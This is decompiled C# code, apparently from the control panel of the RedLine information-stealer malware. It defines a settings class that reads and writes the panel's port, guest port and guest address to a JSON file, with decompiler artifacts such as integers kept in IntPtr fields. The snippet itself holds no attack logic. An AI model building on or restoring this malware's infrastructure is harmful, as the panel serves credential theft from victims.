using System;
using System.IO;
using System.Runtime.CompilerServices;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace RedLine.MainPanel.Models;

public class ServiceSettings
{
	[CompilerGenerated]
	private IntPtr intptr_0;

	[CompilerGenerated]
	private IntPtr intptr_1;

	[CompilerGenerated]
	private object object_0;

	public int Port
	{
		[CompilerGenerated]
		get
		{
			return (int)(nint)intptr_0;
		}
		[CompilerGenerated]
		set
		{
			intptr_0 = (IntPtr)value;
		}
	}

	public int GuestPort
	{
		[CompilerGenerated]
		get
		{
			return (int)(nint)intptr_1;
		}
		[CompilerGenerated]
		set
		{
			intptr_1 = (IntPtr)value;
		}
	}

	public string GuestAdress
	{
		[CompilerGenerated]
		get
		{
			return (string)object_0;
		}
		[CompilerGenerated]
		set
		{
			object_0 = value;
		}
	}

	private string SettingsFile => "serviceSettings.json";

	public void LoadSettings()
	{
		try
		{
			if (File.Exists(SettingsFile))
			{
				string text = File.ReadAllText(SettingsFile);
				if (!string.IsNullOrWhiteSpace(text))
				{
					ServiceSettings serviceSettings = ((JToken)JObject.Parse(text)).ToObject<ServiceSettings>();
					Port = serviceSettings.Port;
					GuestPort = serviceSettings.GuestPort;
					GuestAdress = serviceSettings.GuestAdress;
				}
				else
				{
					a();
				}
			}
			else
			{
				a();
				SaveSettings();
			}
		}
		catch
		{
			a();
		}
	}

	public void SaveSettings()
	{
		string contents = JsonConvert.SerializeObject((object)this, (Formatting)1);
		File.WriteAllText(SettingsFile, contents);
	}

	private void a()
	{
		Port = new Random().Next(1024, 49151);
		GuestPort = 7766;
		GuestAdress = "localhost";
	}
}
